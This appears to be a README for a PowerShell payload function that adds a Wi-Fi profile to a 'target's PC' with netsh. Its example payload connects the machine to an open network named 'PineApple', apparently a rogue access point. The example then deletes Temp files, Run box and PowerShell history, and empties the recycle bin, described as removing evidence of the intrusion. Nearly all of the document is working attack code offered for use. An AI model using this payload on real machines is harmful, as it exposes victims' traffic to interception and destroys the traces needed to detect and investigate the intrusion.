## Description

This function will add a network profile to your targets PC  

## The Function

### [Add-NetWork] 

This function will accept 3 parameters, 1 is mandatory 

You always have to provide the $SSID to give your network a name 

The $Security parameter is defined automatically when providing a password or not 

This will tell the function whether or not you need a wifi password for your network 

If a wifi password is deemed necessary you provide it using the $PW variable 

Set-up a new network profile on your targets PC using the following syntax: 

```PowerShell
# For a network profile using a Password use:

Add-NetWork -SSID wifi-name -PW wifi-password

# For a network profile NOT using a Password use:

Add-NetWork -SSID wifi-name 

```


```PowerShell
function Add-NetWork {

[CmdletBinding()]
param (	
[Parameter (Mandatory = $True)]
[string]$SSID,

[Parameter (Mandatory = $False)]
[Alias("s")]
[string]$Security,

[Parameter (Mandatory = $False)]
[string]$PW

)

if (!$PW) {$Security = "f"}
if ($PW) {$Security = "t"}

# -------------------------------------------------------------------------------------------------

$sec = switch ( $Security )
{
    "t"  { 
"
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$PW</keyMaterial>
            </sharedKey>
        </security>
"
}
    "f" { 

"
        <security>
            <authEncryption>
                <authentication>open</authentication>
                <encryption>none</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
        </security>
" 

}
}

# -------------------------------------------------------------------------------------------------

$profilefile="ACprofile.xml"
$SSIDHEX=($SSID.ToCharArray() |foreach-object {'{0:X}' -f ([int]$_)}) -join''
$xmlfile="<?xml version=""1.0""?>
<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">
    <name>$SSID</name>
    <SSIDConfig>
        <SSID>
            <hex>$SSIDHEX</hex>
            <name>$SSID</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
$sec
    </MSM>
</WLANProfile>
"

$XMLFILE > ($profilefile)
netsh wlan add profile filename="$($profilefile)"
}
```


## Examples 

Listed below are payloads that have used one of these functions:

- Add a Pineapple network profile
```PowerShell
$profilefile="Home.xml"
$SSID="PineApple"
$SSIDHEX=($SSID.ToCharArray() |foreach-object {'{0:X}' -f ([int]$_)}) -join''
$xmlfile="<?xml version=""1.0""?>
<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">
<name>$SSID</name>
<SSIDConfig>
<SSID>
<hex>$SSIDHEX</hex>
<name>$SSID</name>
</SSID>
</SSIDConfig>
<connectionType>ESS</connectionType>
<connectionMode>manual</connectionMode>
<MSM>
<security>
<authEncryption>
<authentication>open</authentication>
<encryption>none</encryption>
<useOneX>false</useOneX>
</authEncryption>
</security>
</MSM>
</WLANProfile>
"
$XMLFILE > ($profilefile)
netsh wlan add profile filename="$($profilefile)"
netsh wlan connect name=$SSID

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
```
